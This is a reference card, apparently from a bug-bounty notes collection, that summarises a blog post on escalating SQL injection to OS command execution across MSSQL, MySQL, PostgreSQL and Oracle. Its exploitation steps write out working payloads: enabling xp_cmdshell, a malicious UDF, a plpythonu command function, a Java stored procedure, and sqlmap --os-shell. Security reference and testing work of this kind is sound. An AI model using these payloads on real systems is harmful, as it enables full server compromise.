# SQLi to RCE across four DBMS: xp_cmdshell, MySQL UDF, PostgreSQL plpythonu, Oracle Java

- **Vuln type / sub-variant:** reference of DBMS-specific SQLi-to-RCE primitives (MSSQL, MySQL, PostgreSQL, Oracle)
- **Target type:** any SQLi where the DB account has enough privilege to reach the OS
- **Recon signal:** confirmed SQLi + a high-privilege DB context (sysadmin / FILE / plugin-dir write / Java privs)
- **Root cause:** DB engines expose command-execution features that a privileged injected query can abuse
- **Exploitation steps:**
  1. MSSQL `xp_cmdshell`: `EXEC sp_configure 'show advanced options',1;RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE; xp_cmdshell 'whoami';`.
  2. MySQL UDF: compile a malicious `.so` exporting `sys_exec()` (calls `system()`), drop it in the plugin dir, `CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'malicious_udf.so';`, then `SELECT sys_exec('whoami');`.
  3. PostgreSQL `plpythonu`: `CREATE EXTENSION plpythonu; CREATE FUNCTION exec_cmd(cmd text) RETURNS void AS $$ import os; os.system(cmd) $$ LANGUAGE plpythonu; SELECT exec_cmd('whoami');` (also `COPY ... TO/FROM PROGRAM`).
  4. Oracle Java: `CREATE JAVA SOURCE ... CmdExec` running `Runtime.getRuntime().exec(cmd)`, wrap in a PL/SQL function, `SELECT exec_cmd('whoami') FROM dual;`.
  5. Automate: `sqlmap -u "..." --os-shell` picks the right technique.
- **Bypasses used:** each requires elevated DB privileges; UDF needs plugin-dir write; PG needs the untrusted language installed
- **Impact:** OS command execution (full server compromise) from a SQLi
- **Bounty:** reference
- **Lesson / pattern:** the RCE path is DBMS-specific and privilege-gated: xp_cmdshell (MSSQL), UDF (MySQL), plpythonu/COPY PROGRAM (PostgreSQL), Java stored proc (Oracle). `sqlmap --os-shell` automates it. Least-privilege DB accounts are the mitigation after parameterization.
- **Source:**
  - Title: Exploiting SQL Injection for RCE: Four Techniques Across Popular Databases
  - Author: Anas Eladly (0x3adly)
  - URL: https://medium.com/@0x3adly/from-sql-injection-to-rce-leveraging-vulnerability-for-maximum-impact-2fb356907eed
  - Date: 2024-11-04 (scraped 2026-11-19)
  - Raw file: `sources/sqli/20-0x3adly-sqli-to-rce-four-techniques.md`

Tags: rce, reference, mssql, mysql, postgresql, oracle, xp-cmdshell, udf, plpythonu, java-stored-proc, copy-to-program, sqlmap, os-shell, privilege-escalation
